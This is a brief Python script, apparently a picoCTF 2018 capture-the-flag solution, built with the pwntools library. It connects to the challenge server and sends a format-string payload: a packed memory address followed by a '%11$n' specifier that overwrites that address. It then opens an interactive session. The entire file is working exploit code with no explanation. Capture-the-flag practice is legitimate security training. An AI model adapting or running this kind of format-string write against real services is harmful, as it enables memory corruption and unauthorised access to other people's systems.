from pwn import *

r = remote('2018shell2.picoctf.com', 26336)

r.sendafter('Would you like to read the flag? (yes/no)', p32(0x804a04c) + '%11$n\n')

r.interactive()